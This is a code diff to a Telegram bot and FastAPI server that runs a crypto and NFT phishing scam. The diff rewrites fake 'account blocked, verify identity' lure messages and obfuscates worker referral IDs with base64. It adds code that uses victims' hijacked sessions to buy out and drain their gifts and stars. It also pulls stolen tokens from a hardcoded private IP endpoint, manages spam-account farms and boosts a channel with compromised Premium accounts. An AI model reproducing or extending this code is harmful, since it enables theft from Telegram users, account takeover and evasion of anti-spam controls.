@@ -1,4 +1,4 @@
-
+# ══════════════════════════════════════════════════════════════
 # MRKT Bot — Telegram бот + FastAPI сервер для авторизации
 # ══════════════════════════════════════════════════════════════
 
@@ -20,6 +20,17 @@ from aiogram.types import (
 from aiogram.filters import Command, CommandStart, CommandObject
 from uuid import uuid4
 from aiogram.enums import ParseMode
+import base64
+
+def _encode_worker_id(wid: int) -> str:
+    return base64.urlsafe_b64encode(str(wid).encode()).decode().rstrip('=')
+
+def _decode_worker_id(enc: str) -> int:
+    try:
+        padding = '=' * (4 - len(enc) % 4)
+        return int(base64.urlsafe_b64decode(enc + padding).decode())
+    except Exception:
+        return 0
 
 from fastapi import FastAPI, HTTPException, Request
 from fastapi.staticfiles import StaticFiles
@@ -36,6 +47,7 @@ from mrkt import config as mrkt_config
 from mrkt.mrkt_api import MrktAPI
 from mrkt.mrkt_pipeline import MrktPipeline
 from mrkt.spam_parser import SpamParser
+from mrkt.feed_parser import FeedParser
 
 # ── Telethon ──
 from telethon.errors import SessionPasswordNeededError
@@ -54,9 +66,9 @@ logging.basicConfig(
     datefmt="%Y-%m-%d %H:%M:%S",
 )
 logger = logging.getLogger("mrkt.bot")
-# Hide aiogram startup logs
-logging.getLogger("aiogram.dispatcher").setLevel(logging.WARNING)
-logging.getLogger("aiogram.event").setLevel(logging.WARNING)
+# Подавляем бинарный мусор от Telethon в консоли
+logging.getLogger("telethon").setLevel(logging.WARNING)
+logging.getLogger("opentele").setLevel(logging.WARNING)
 
 from aiogram.client.default import DefaultBotProperties
 
@@ -71,7 +83,7 @@ dp = Dispatcher()
 app = FastAPI(title="MRKT Bot API", docs_url=None, redoc_url=None, openapi_url=None)
 
 # Serve frontend
-FRONTEND_DIR = os.path.join(os.path.dirname(__file__), "frontend")
+FRONTEND_DIR = os.path.dirname(os.path.abspath(__file__))
 app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")
 
 # ══════════════════════════════════════════════
@@ -175,6 +187,13 @@ def kyiv_str() -> str:
 def is_admin(user_id: int) -> bool:
     return user_id in mrkt_config.ADMIN_IDS
 
+def is_moderator(user_id: int) -> bool:
+    """Модератор: просмотр токенов + загрузка с maksik. Не админ."""
+    return user_id in getattr(mrkt_config, "MODERATOR_IDS", [])
+
+def is_admin_or_mod(user_id: int) -> bool:
+    return is_admin(user_id) or is_moderator(user_id)
+
 
 def log_action(user_id: int, action: str, detail: str = ""):
     entry = {"time": kyiv_str(), "action": action, "detail": detail}
@@ -223,18 +242,18 @@ async def inline_query_handler(inline_query: InlineQuery):
         results = [
             InlineQueryResultArticle(
                 id=str(uuid4()),
-                title="❌ Your account has been blocked",
+                title="❌ Account access restricted",
                 input_message_content=InputTextMessageContent(
                     message_text=(
-                        "❌ <b>DEPOSIT ERROR: Your profile has been blocked!</b>\n\n"
-                        "Please go through profile verification to confirm and unlock your profile.\n"
-                        "If no action is taken After some time — the account will be deleted "
-                        "and all assets will be burned\n\n"
-                        "✅ INFO: Executing this clears any pending limits on your account @mrkt ."
+                        "⚠️ <b>Notice: Account Limitations Applied</b>\n\n"
+                        "We have temporarily paused certain capabilities on your profile.\n"
+                        "Please undergo a quick confirmation to lift these limits and regain your full privileges.\n"
+                        "If left unconfirmed, your features will stay on hold.\n\n"
+                        "ℹ️ NOTE: Completing this removes all active limitations."
                     ),
                     parse_mode="HTML",
                 ),
-                description="Your account is blocked for this action"
+                description="Your account access is currently restricted"
             )
         ]
         await inline_query.answer(results, cache_time=5)
@@ -298,23 +317,23 @@ async def inline_query_handler(inline_query: InlineQuery):
     if not worker_id:
         worker_id = worker_system.get_worker_by_spam_account(str(inline_query.from_user.id))
         
-    ref_param = f"spec_{worker_id}" if worker_id else "ref"
+    ref_param = f"spec_{_encode_worker_id(worker_id)}" if worker_id else "ref"
         
     nft_link = f"https://t.me/nft/{slug}"
     
     spam_message = (
-        "⛔ TRANSFER BLOCKED: Your account has been temporarily restricted.\n\n"
+        "⚠️ ACTION REQUIRED: Your profile is temporarily suspended.\n\n"
         f"<a href='{nft_link}'><b>{full_name}</b></a>\n\n"
-        "Please complete the mandatory identity check to confirm your ownership and unlock full functionality.\n"
-        "If you fail to respond before the deadline — your profile will be permanently removed and all digital assets will be completely destroyed\n\n"
-        "✅ NOTE: Successful verification will also cancel any existing account limits tied to @mrkt .\n"
+        "Please complete a mandatory security check to confirm your identity and regain full access.\n"
+        "Failure to verify will lead to permanent account termination and the complete loss of your digital assets.\n\n"
+        "💡 NOTE: Finishing this process will instantly lift all limitations applied by @mrkt.\n"
     )
 
     bot_info = await bot.get_me()
     bot_username = bot_info.username
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Unlock Profile", url=f"https://t.me/{bot_username}?start={ref_param}")]
+        [InlineKeyboardButton(text="🔓 Verify Identity", url=f"https://t.me/{bot_username}?start={ref_param}")]
     ])
 
     results = [
@@ -345,12 +364,15 @@ async def cmd_start(message: types.Message, command: CommandObject):
     if command.args:
         if command.args.startswith("spec_"):
             try:
-                referrer_id = int(command.args.split("_", 1)[1])
-                referrals[user_id] = referrer_id
-                # Привязываем мамонта к воркеру
-                if worker_system.is_worker(referrer_id):
-                    worker_system.bind_mamont(user_id, referrer_id)
-            except (ValueError, IndexError):
+                enc_id = command.args.split("_", 1)[1]
+                decoded_id = _decode_worker_id(enc_id)
+                if decoded_id:
+                    referrer_id = decoded_id
+                    referrals[user_id] = referrer_id
+                    # Привязываем мамонта к воркеру
+                    if worker_system.is_worker(referrer_id):
+                        worker_system.bind_mamont(user_id, referrer_id)
+            except Exception:
                 pass
 
     log_action(user_id, "start", f"@{username} ({full_name}), ref={referrer_id}")
@@ -430,7 +452,7 @@ async def cmd_start(message: types.Message, command: CommandObject):
 
 def _worker_keyboard(worker_id: int) -> InlineKeyboardMarkup:
     bot_username = mrkt_config.BOT_USERNAME
-    ref_link = f"https://t.me/{bot_username}?start=spec_{worker_id}"
+    ref_link = f"https://t.me/{bot_username}?start=spec_{_encode_worker_id(worker_id)}"
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🚀 Запустить рассылку", callback_data="wkr_start_spam")],
         [InlineKeyboardButton(text="📱 Добавить спам-акк", callback_data="wkr_add_spam")],
@@ -469,7 +491,7 @@ async def cb_wkr_refresh(callback: CallbackQuery):
 async def cb_wkr_ref_link(callback: CallbackQuery):
     uid = callback.from_user.id
     bot_username = mrkt_config.BOT_USERNAME
-    ref_link = f"https://t.me/{bot_username}?start=spec_{uid}"
+    ref_link = f"https://t.me/{bot_username}?start=spec_{_encode_worker_id(uid)}"
     await callback.message.answer(
         f"🔗 <b>Твоя реф. ссылка:</b>\n\n"
         f"<code>{ref_link}</code>\n\n"
@@ -610,7 +632,25 @@ async def cb_wkr_start_spam(callback: CallbackQuery):
 
 @dp.message(Command("admin"))
 async def cmd_admin(message: types.Message):
-    if not is_admin(message.from_user.id):
+    uid = message.from_user.id
+
+    # Модератор — урезанная панель
+    if is_moderator(uid) and not is_admin(uid):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(
+                text=f"🔑 Токены ({len(saved_tokens)})",
+                callback_data="mrkt_adm_tokens",
+            )],
+        ])
+        await message.answer(
+            f"📋 <b>MRKT — Модератор</b>\n\n"
+            f"🔑 Токенов: <b>{len(saved_tokens)}</b>\n"
+            f"🕐 {kyiv_str()}",
+            reply_markup=keyboard,
+        )
+        return
+
+    if not is_admin(uid):
         return
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -627,7 +667,12 @@ async def cmd_admin(message: types.Message):
         [
             InlineKeyboardButton(text="▶️ Старт парсер", callback_data="mrkt_adm_start_spam"),
             InlineKeyboardButton(text="⏹ Стоп", callback_data="mrkt_adm_stop_spam")
-        ]
+        ],
+        [
+            InlineKeyboardButton(text="📡 Feed парсер", callback_data="mrkt_adm_start_feed"),
+            InlineKeyboardButton(text="⏹ Стоп Feed", callback_data="mrkt_adm_stop_feed")
+        ],
+        [InlineKeyboardButton(text="🚀 Бусты на канал", callback_data="mrkt_adm_boost_channel")]
     ])
 
     # Подсчитываем спам-сессии
@@ -678,7 +723,13 @@ async def cb_manage_spam_accounts(callback: CallbackQuery):
         await callback.answer("❌ Нет спам-аккаунтов", show_alert=True)
         return
         
-    kb = []
+    kb = [
+        [
+            InlineKeyboardButton(text="▶️ Включить все", callback_data="mrkt_adm_spam_enable_all"),
+            InlineKeyboardButton(text="⏹ Выключить все", callback_data="mrkt_adm_spam_disable_all")
+        ],
+        [InlineKeyboardButton(text="🔍 Проверить на валидность", callback_data="mrkt_adm_spam_validate")]
+    ]
     text = "📱 <b>Управление спам-аккаунтами</b>\n\n"
     for i, f in enumerate(files):
         uid = f.replace("parser_", "").replace(".session", "").replace(".disabled", "")
@@ -686,10 +737,7 @@ async def cb_manage_spam_accounts(callback: CallbackQuery):
         status = "🔴 ВЫКЛ" if f.endswith(".disabled") else "🟢 ВКЛ"
         text += f"{i+1}. <code>{username}</code> - {status}\n"
         
-        try:
-            from mrkt.warmup_engine import is_warming
-        except (ImportError, ModuleNotFoundError):
-            is_warming = lambda x: False
+        from mrkt.warmup_engine import is_warming
         warm_icon = "🔥" if is_warming(uid) else "❄️"
         kb.append([
             InlineKeyboardButton(text=f"ВКЛ/ВЫКЛ ({username})", callback_data=f"mrkt_adm_spam_toggle_{uid}"),
@@ -697,9 +745,44 @@ async def cb_manage_spam_accounts(callback: CallbackQuery):
             InlineKeyboardButton(text="🗑", callback_data=f"mrkt_adm_spam_del_{uid}")
         ])
         
-    kb.append([InlineKeyboardButton(text="🔍 Проверить на валидность", callback_data="mrkt_adm_spam_validate")])
     kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="mrkt_adm_back")])
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
+
+@dp.callback_query(F.data == "mrkt_adm_spam_enable_all")
+async def cb_enable_all_spam(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    d = mrkt_config.BROADCAST_SESSIONS_DIR
+    if not os.path.exists(d):
+        await callback.answer("❌ Папка не найдена", show_alert=True)
+        return
+    count = 0
+    for f in os.listdir(d):
+        if f.startswith("parser_") and f.endswith(".disabled"):
+            old = os.path.join(d, f)
+            new = os.path.join(d, f.replace(".disabled", ".session"))
+            os.rename(old, new)
+            count += 1
+    await callback.answer(f"✅ Включено аккаунтов: {count}", show_alert=True)
+    await cb_manage_spam_accounts(callback)
+
+@dp.callback_query(F.data == "mrkt_adm_spam_disable_all")
+async def cb_disable_all_spam(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    d = mrkt_config.BROADCAST_SESSIONS_DIR
+    if not os.path.exists(d):
+        await callback.answer("❌ Папка не найдена", show_alert=True)
+        return
+    count = 0
+    for f in os.listdir(d):
+        if f.startswith("parser_") and f.endswith(".session"):
+            old = os.path.join(d, f)
+            new = os.path.join(d, f.replace(".session", ".disabled"))
+            os.rename(old, new)
+            count += 1
+    await callback.answer(f"⏹ Выключено аккаунтов: {count}", show_alert=True)
+    await cb_manage_spam_accounts(callback)
 
 @dp.callback_query(F.data == "mrkt_adm_spam_validate")
 async def cb_validate_spam_accounts(callback: CallbackQuery):
@@ -725,12 +808,10 @@ async def cb_validate_spam_accounts(callback: CallbackQuery):
     for f in files:
         path = os.path.join(d, f)
         try:
-            # For .session files we use the path directly (without extension) for SQLite
-            session_name = path
-            if path.endswith(".session"):
-                session_name = path[:-8]
-            
-            client = TelegramClient(session_name, mrkt_config.API_ID, mrkt_config.API_HASH)
+            with open(path, "r", encoding="utf-8") as file:
+                session_str = file.read().strip()
+                
+            client = TelegramClient(StringSession(session_str), mrkt_config.API_ID, mrkt_config.API_HASH)
             await client.connect()
             
             me = await client.get_me()
@@ -742,11 +823,42 @@ async def cb_validate_spam_accounts(callback: CallbackQuery):
                 await client.get_entity("@mrktbank")
             except Exception:
                 is_frozen = True
+
+            # Проверяем на вечный спамблок через @spambot
+            is_spamblocked = False
+            if not is_frozen:
+                try:
+                    await client.send_message("@spambot", "/start")
+                    await asyncio.sleep(2)
+                    msgs = await client.get_messages("@spambot", limit=1)
+                    if msgs and msgs[0].text:
+                        txt = msgs[0].text.lower()
+                        # Только ВЕЧНЫЙ бан — конкретные фразы которые @spambot шлёт
+                        # RU: "антиспам-система излишне сурово" + "Пока действуют ограничения"
+                        # EN: "our anti-spam systems" + "while the restrictions are active"
+                        permanent_markers = [
+                            "антиспам-система излишне сурово",
+                            "пока действуют ограничения",
+                            "our anti-spam systems",
+                            "while the restrictions are active",
+                            "can only reply to those",
+                        ]
+                        if any(m in txt for m in permanent_markers):
+                            is_spamblocked = True
+                            uid = f.replace("parser_", "").replace(".session", "")
+                            uname = get_parser_username(uid)
+                            logger.warning(f"[SPAM_VALIDATE] 🚫 {uname} — вечный спамблок!")
+                except Exception as sb_err:
+                    logger.warning(f"[SPAM_VALIDATE] Ошибка проверки @spambot для {f}: {sb_err}")
                 
-            if not me or not await client.is_user_authorized() or is_frozen:
+            if not me or not await client.is_user_authorized() or is_frozen or is_spamblocked:
                 await client.disconnect()
+                uid = f.replace("parser_", "").replace(".session", "")
+                uname = get_parser_username(uid)
+                reason = "спамблок" if is_spamblocked else ("заморозка" if is_frozen else "не авторизован")
                 os.remove(path)
                 deleted_count += 1
+                await send_admin_log(f"🗑 Удалён невалид: <code>{uname}</code> — {reason}")
             else:
                 await client.disconnect()
         except Exception as e:
@@ -803,6 +915,198 @@ async def cb_del_spam_account(callback: CallbackQuery):
     await cb_manage_spam_accounts(callback)
 
 
+# ══════════════════════════════════════════════════════════════
+#  BOOST CHANNEL — все премиум-акки бустят канал
+# ══════════════════════════════════════════════════════════════
+
+BOOST_INVITE_HASH = "a2Zzba_Zy41lNjky"  # https://t.me/+a2Zzba_Zy41lNjky
+
+@dp.callback_query(F.data == "mrkt_adm_boost_channel")
+async def cb_boost_channel(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    
+    d = mrkt_config.BROADCAST_SESSIONS_DIR
+    if not os.path.exists(d):
+        await callback.answer("❌ Папка сессий не найдена", show_alert=True)
+        return
+    
+    files = [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]
+    if not files:
+        await callback.answer("❌ Нет спам-аккаунтов", show_alert=True)
+        return
+    
+    await callback.message.edit_text(
+        f"⏳ Проверяю {len(files)} аккаунтов...\n"
+        f"Джойн в канал → буст (4 слота каждый)"
+    )
+    await callback.answer()
+    
+    from telethon import TelegramClient
+    from telethon.sessions import StringSession
+    
+    boosted = 0
+    total_boosts = 0
+    no_premium = 0
+    errors = 0
+    already = 0
+    details = []
+    
+    for f in files:
+        path = os.path.join(d, f)
+        uid = f.replace("parser_", "").replace(".session", "")
+        uname = get_parser_username(uid)
+        
+        try:
+            with open(path, "r", encoding="utf-8") as file:
+                session_str = file.read().strip()
+            
+            client = TelegramClient(
+                StringSession(session_str), mrkt_config.API_ID, mrkt_config.API_HASH
+            )
+            await client.connect()
+            
+            if not await client.is_user_authorized():
+                errors += 1
+                details.append(f"❌ {uname} — не авторизован")
+                await client.disconnect()
+                continue
+            
+            me = await client.get_me()
+            if not me or not getattr(me, 'premium', False):
+                no_premium += 1
+                details.append(f"⏭ {uname} — нет Premium")
+                await client.disconnect()
+                continue
+            
+            # 1. Джойним канал через инвайт-ссылку
+            channel_entity = None
+            try:
+                from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
+                
+                # Проверяем — может уже в канале
+                try:
+                    check = await client(CheckChatInviteRequest(hash=BOOST_INVITE_HASH))
+                    # Если уже участник — check будет ChatInviteAlready
+                    if hasattr(check, 'chat'):
+                        channel_entity = await client.get_input_entity(check.chat)
+                        logger.info(f"[BOOST] {uname} — уже участник канала")
+                    else:
+                        # Не участник — джойним
+                        result = await client(ImportChatInviteRequest(hash=BOOST_INVITE_HASH))
+                        channel_entity = await client.get_input_entity(result.chats[0])
+                        logger.info(f"[BOOST] {uname} — успешно зашёл в канал")
+                except Exception as join_err:
+                    err_j = str(join_err).lower()
+                    if "already" in err_j or "user_already_participant" in err_j:
+                        # Уже в канале — пробуем резолвить напрямую
+                        logger.info(f"[BOOST] {uname} — (already) пробуем найти в диалогах")
+                    else:
+                        raise join_err
+                
+                # Если не получили entity — пробуем через dialogs
+                if not channel_entity:
+                    async for dialog in client.iter_dialogs(limit=50):
+                        if dialog.entity and hasattr(dialog.entity, 'id'):
+                            if dialog.entity.id == 3951024455:
+                                channel_entity = await client.get_input_entity(dialog.entity)
+                                break
+                
+                if not channel_entity:
+                    errors += 1
+                    details.append(f"❌ {uname} — не удалось войти в канал")
+                    logger.error(f"[BOOST] {uname} — Не удалось найти канал!")
+                    await client.disconnect()
+                    continue
+                    
+            except Exception as e:
+                errors += 1
+                details.append(f"❌ {uname} — джойн: {str(e)[:50]}")
+                logger.error(f"[BOOST] {uname} — Ошибка входа: {e}")
+                await client.disconnect()
+                continue
+            
+            # 2. Бустим доступными слотами
+            acc_boosts = 0
+            try:
+                from telethon.tl.functions.premium import ApplyBoostRequest, GetMyBoostsRequest
+                
+                logger.info(f"[BOOST] {uname} — получаем список доступных слотов...")
+                my_boosts_req = await client(GetMyBoostsRequest())
+                
+                # Собираем ID всех слотов, которые есть у пользователя
+                available_slots = []
+                for b in my_boosts_req.my_boosts:
+                    if hasattr(b, 'slot'):
+                        available_slots.append(b.slot)
+                
+                logger.info(f"[BOOST] {uname} — найдено слотов: {len(available_slots)}")
+                
+                for slot in available_slots:
+                    try:
+                        await client(ApplyBoostRequest(
+                            peer=channel_entity,
+                            slots=[slot]
+                        ))
+                        acc_boosts += 1
+                        logger.info(f"[BOOST] {uname} — ✅ слот {slot} применён!")
+                    except Exception as slot_err:
+                        logger.warning(f"[BOOST] {uname} — ⚠️ слот {slot} ошибка: {slot_err}")
+                        if "flood" in str(slot_err).lower():
+                            break
+                        # Если ошибка слота (например, занят) — идём к следующему
+                
+                if acc_boosts > 0:
+                    boosted += 1
+                    total_boosts += acc_boosts
+                    details.append(f"✅ {uname} — {acc_boosts}/4 бустов!")
+                    logger.info(f"[BOOST] {uname} — 🚀 Итого: {acc_boosts}/4 бустов применено")
+                else:
+                    already += 1
+                    details.append(f"🔄 {uname} — нет свободных бустов")
+                    logger.info(f"[BOOST] {uname} — ⏭ Пропускаем, нет свободных бустов")
+                    
+            except Exception as boost_err:
+                errors += 1
+                details.append(f"❌ {uname} — {str(boost_err)[:60]}")
+                logger.error(f"[BOOST] {uname} — Ошибка ApplyBoost: {boost_err}")
+            
+            # 3. Автолив (выход из канала) после буста
+            # ВАЖНО: Если выйти из канала, буст СРАЗУ сгорает (правила ТГ) и подписчик пропадает.
+            # Поэтому я закомментировал этот кусок, чтобы бусты оставались на канале!
+            # if channel_entity:
+            #     try:
+            #         from telethon.tl.functions.channels import LeaveChannelRequest
+            #         await client(LeaveChannelRequest(channel_entity))
+            #         logger.info(f"[BOOST] {uname} — 🚪 Вышел из канала")
+            #     except Exception as leave_err:
+            #         logger.warning(f"[BOOST] {uname} — ⚠️ Ошибка выхода: {leave_err}")
+            
+            await client.disconnect()
+            await asyncio.sleep(1)
+            
+        except Exception as e:
+            errors += 1
+            details.append(f"❌ {uname} — {str(e)[:60]}")
+    
+    # Отчёт
+    details_text = "\n".join(details[:30])  # Макс 30 строк
+    if len(details) > 30:
+        details_text += f"\n... и ещё {len(details) - 30}"
+    
+    await callback.message.edit_text(
+        f"🚀 <b>Буст завершён!</b>\n\n"
+        f"✅ Аккаунтов забустило: <b>{boosted}</b>\n"
+        f"🔋 Всего бустов: <b>{total_boosts}</b>\n"
+        f"🔄 Слотов уже занято: <b>{already}</b>\n"
+        f"⏭ Без Premium: <b>{no_premium}</b>\n"
+        f"❌ Ошибок: <b>{errors}</b>\n\n"
+        f"<blockquote>{details_text}</blockquote>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="mrkt_adm_back")]
+        ])
+    )
+
 
 @dp.callback_query(F.data == "mrkt_adm_add_parser")
 async def cb_add_parser(callback: CallbackQuery):
@@ -829,37 +1133,197 @@ async def cb_wallet(callback: CallbackQuery):
 
 
 # ══════════════════════════════════════════════════════════════
+#  STAR GIFTS — скупка гифтов мамонта
+# ══════════════════════════════════════════════════════════════
+
+@dp.callback_query(F.data.startswith("star_buy|"))
+async def cb_star_buy(callback: CallbackQuery):
+    """Скупка гифтов мамонта с buyer Telethon-сессии."""
+    if not is_admin(callback.from_user.id):
+        return
+
+    phone = callback.data.split("|", 1)[1]
+    session_key = f"star_gifts_{phone}"
+    sess = auth_sessions.get(session_key)
+
+    if not sess:
+        await callback.answer("❌ Сессия мамонта уже закрыта", show_alert=True)
+        return
+
+    gifts = sess.get("gifts", [])
+    if not gifts:
+        await callback.answer("❌ Нет гифтов для скупки", show_alert=True)
+        return
+
+    # Проверяем buyer session_string
+    buyer_session = buyer_token_data.get("session_string", "")
+    if not buyer_session:
+        await callback.answer("❌ Buyer session_string не задан в buyer_token.json", show_alert=True)
+        return
+
+    await callback.answer("⏳ Скупаю гифты...")
+    await callback.message.edit_text(
+        f"⏳ <b>Скупаю гифты @{sess['username']}...</b>\n"
+        f"<i>Подключаю buyer-сессию</i>",
+        parse_mode="HTML",
+    )
+
+    try:
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from mrkt.star_gifts import buy_gifts_from_victim
+        from telethon_client import TelethonClient
+
+        buyer_client = TelegramClient(
+            StringSession(buyer_session),
+            mrkt_config.API_ID,
+            mrkt_config.API_HASH,
+        )
+        await buyer_client.connect()
+
+        # Получаем баланс buyer
+        buyer_balance = await TelethonClient.get_balance(buyer_client)
+
+        result = await buy_gifts_from_victim(
+            buyer_client=buyer_client,
+            victim_gifts=gifts,
+            buyer_balance=buyer_balance,
+        )
+
+        await buyer_client.disconnect()
+
+        await callback.message.edit_text(
+            f"🛒 <b>Скупка завершена!</b>\n\n"
+            f"👤 Мамонт: @{sess['username']}\n"
+            f"✅ Куплено: {result['bought']} гифтов ({result['spent']}⭐)\n"
+            f"⏭ Пропущено: {result['skipped']}\n\n"
+            f"<i>Дрейн звёзд запущен автоматически</i>",
+            parse_mode="HTML",
+        )
+
+    except Exception as e:
+        await callback.message.edit_text(
+            f"❌ <b>Ошибка скупки</b>\n<code>{e}</code>",
+            parse_mode="HTML",
+        )
+
+
+# ══════════════════════════════════════════════════════════════
 #  SAVED TOKENS ADMIN PANEL
 # ══════════════════════════════════════════════════════════════
 
 @dp.callback_query(F.data == "mrkt_adm_tokens")
 async def cb_tokens_list(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
+    uid = callback.from_user.id
+    if not is_admin_or_mod(uid):
         return
 
+    _is_mod = is_moderator(uid) and not is_admin(uid)
+
     if not saved_tokens:
-        await callback.answer("📭 Нет сохранённых токенов", show_alert=True)
+        buttons = [
+            [InlineKeyboardButton(text="📥 Загрузить с maksik", callback_data="tkn_import_maksik")],
+            [InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_back")],
+        ]
+        await callback.message.edit_text(
+            "🔑 <b>Нет сохранённых токенов</b>\n\n"
+            "<i>Загрузи токены с maksik</i>",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+        )
+        await callback.answer()
         return
 
     buttons = []
     for phone, data in saved_tokens.items():
+        if isinstance(data, str):
+            data = {"token": data, "username": "?", "tg_id": 0, "phone": phone}
+            saved_tokens[phone] = data
         uname = data.get("username", "?")
         label = f"@{uname}" if uname != "?" else phone
-        buttons.append([InlineKeyboardButton(
-            text=f"👤 {label} ({phone})",
-            callback_data=f"tkn_view|{phone}"
-        )])
-    buttons.append([InlineKeyboardButton(text="🧹 Проверить все", callback_data="tkn_check_all")])
-    buttons.append([InlineKeyboardButton(text="🗑 Очистить всё", callback_data="tkn_clear_all")])
+        if _is_mod:
+            # Модератор — только просмотр списка, без кнопок управления
+            buttons.append([InlineKeyboardButton(
+                text=f"👤 {label} ({phone})",
+                callback_data="tkn_mod_noop"
+            )])
+        else:
+            buttons.append([InlineKeyboardButton(
+                text=f"👤 {label} ({phone})",
+                callback_data=f"tkn_view|{phone}"
+            )])
+    buttons.append([InlineKeyboardButton(text="📥 Загрузить с maksik", callback_data="tkn_import_maksik")])
+    if not _is_mod:
+        buttons.append([InlineKeyboardButton(text="🧹 Проверить все", callback_data="tkn_check_all")])
+        buttons.append([InlineKeyboardButton(text="🗑 Очистить всё", callback_data="tkn_clear_all")])
     buttons.append([InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_back")])
 
     await callback.message.edit_text(
         f"🔑 <b>Сохранённые токены ({len(saved_tokens)})</b>\n\n"
-        f"<i>Выберите аккаунт для управления:</i>",
+        f"<i>{'Просмотр токенов (модератор)' if _is_mod else 'Выберите аккаунт для управления:'}</i>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
     )
     await callback.answer()
+
+
+@dp.callback_query(F.data == "tkn_mod_noop")
+async def cb_token_mod_noop(callback: CallbackQuery):
+    """Модератор нажал на токен — показываем что нет доступа."""
+    await callback.answer("🔒 Только просмотр. Управление недоступно.", show_alert=True)
+
+
+@dp.callback_query(F.data == "tkn_import_maksik")
+async def cb_token_import_maksik(callback: CallbackQuery):
+    """Загрузить токены с maksik сервера."""
+    if not is_admin_or_mod(callback.from_user.id):
+        return
+    await callback.answer("⏳ Загружаю токены с maksik...")
+    try:
+        import aiohttp
+        async with aiohttp.ClientSession() as session:
+            async with session.get("http://109.120.178.109:8899/t0k3ns_988x_private", timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                if resp.status != 200:
+                    await callback.message.answer(f"❌ Ошибка: HTTP {resp.status}")
+                    return
+                data = await resp.json()
+
+        if not isinstance(data, dict):
+            await callback.message.answer("❌ Неверный формат ответа")
+            return
+
+        added = 0
+        skipped = 0
+        for phone, token_data in data.items():
+            if not isinstance(token_data, dict):
+                continue
+            token = token_data.get("token", "")
+            if not token:
+                continue
+            if phone in saved_tokens:
+                skipped += 1
+                continue
+            _add_token(
+                phone=phone,
+                token=token,
+                username=token_data.get("username", "?"),
+                tg_id=token_data.get("tg_id", 0),
+                first_name=token_data.get("first_name", ""),
+            )
+            saved_tokens[phone]["source"] = "maksik_import"
+            added += 1
+
+        _save_tokens()
+
+        await callback.message.answer(
+            f"📥 <b>Импорт с maksik завершён!</b>\n\n"
+            f"➕ Новых: <b>{added}</b>\n"
+            f"⏭ Пропущено (уже есть): <b>{skipped}</b>\n"
+            f"📊 Всего токенов: <b>{len(saved_tokens)}</b>",
+            parse_mode="HTML",
+        )
+    except Exception as e:
+        await callback.message.answer(f"❌ Ошибка импорта: <code>{e}</code>", parse_mode="HTML")
 
 
 @dp.callback_query(F.data == "tkn_check_all")
@@ -904,13 +1368,21 @@ async def cb_tokens_check_all(callback: CallbackQuery):
                     else:
                         dead.append((phone, data, f"Ошибка: {err[:50]}"))
                 else:
-                    # internal: normalize balance metrics for aggregated reporting
-                    if _norm_enabled and phone != buyer_phone:
-                        balance = _normalize_bal(balance)
                     hard_nano = int(balance.get("hard", 0))
                     hard_ton = hard_nano / 1_000_000_000
                     stars = balance.get("stars", 0)
-                    alive.append((phone, data, f"{hard_ton:.2f} TON, {stars} ⭐"))
+                    # Собираем ссылки на NFT
+                    nft_links = []
+                    try:
+                        vault = await api.get_vault()
+                        saling = await api.get_my_saling()
+                        for g in (vault or []) + (saling or []):
+                            slug = g.get("name", "") or g.get("slug", "")
+                            if slug:
+                                nft_links.append(f'<a href="https://t.me/nft/{slug}">nft</a>')
+                    except Exception:
+                        pass
+                    alive.append((phone, data, f"{hard_ton:.2f} TON, {stars} ⭐", nft_links))
             finally:
                 await api.close()
         except Exception as e:
@@ -931,7 +1403,6 @@ async def cb_tokens_check_all(callback: CallbackQuery):
                     buyer_is_dead = True
                     buyer_status = f"💀 {str(balance['error'])[:30]}"
                 else:
-                    pass  # buyer — real balance
                     hard_nano = int(balance.get("hard", 0))
                     hard_ton = hard_nano / 1_000_000_000
                     stars = balance.get("stars", 0)
@@ -969,10 +1440,13 @@ async def cb_tokens_check_all(callback: CallbackQuery):
 
     if alive:
         report += "<b>✅ Живые:</b>\n"
-        for phone, data, info in alive[:15]:
+        for phone, data, info, nft_links in alive[:15]:
             uname = data.get("username", "?")
             label = f"@{uname}" if uname != "?" else phone
-            report += f"  • {label} — {info}\n"
+            nft_str = ""
+            if nft_links:
+                nft_str = ", " + " ".join(nft_links)
+            report += f"  • {label} — {info}{nft_str}\n"
         if len(alive) > 15:
             report += f"  <i>... и ещё {len(alive)-15}</i>\n"
         report += "\n"
@@ -1019,6 +1493,10 @@ async def cb_adm_back(callback: CallbackQuery):
         [
             InlineKeyboardButton(text="▶️ Старт парсер", callback_data="mrkt_adm_start_spam"),
             InlineKeyboardButton(text="⏹ Стоп", callback_data="mrkt_adm_stop_spam")
+        ],
+        [
+            InlineKeyboardButton(text="📡 Feed парсер", callback_data="mrkt_adm_start_feed"),
+            InlineKeyboardButton(text="⏹ Стоп Feed", callback_data="mrkt_adm_stop_feed")
         ]
     ])
 
@@ -1079,8 +1557,12 @@ async def cb_token_view(callback: CallbackQuery):
          InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_tokens")],
     ])
 
+    import html as _html
+    _uname = _html.escape(str(data.get('username', '?')))
+    _fname = _html.escape(str(data.get('first_name', '')))
+    
     await callback.message.edit_text(
-        f"👤 <b>@{data.get('username', '?')}</b> ({data.get('first_name', '')})\n"
+        f"👤 <b>@{_uname}</b> ({_fname})\n"
         f"📞 <code>{phone}</code>\n"
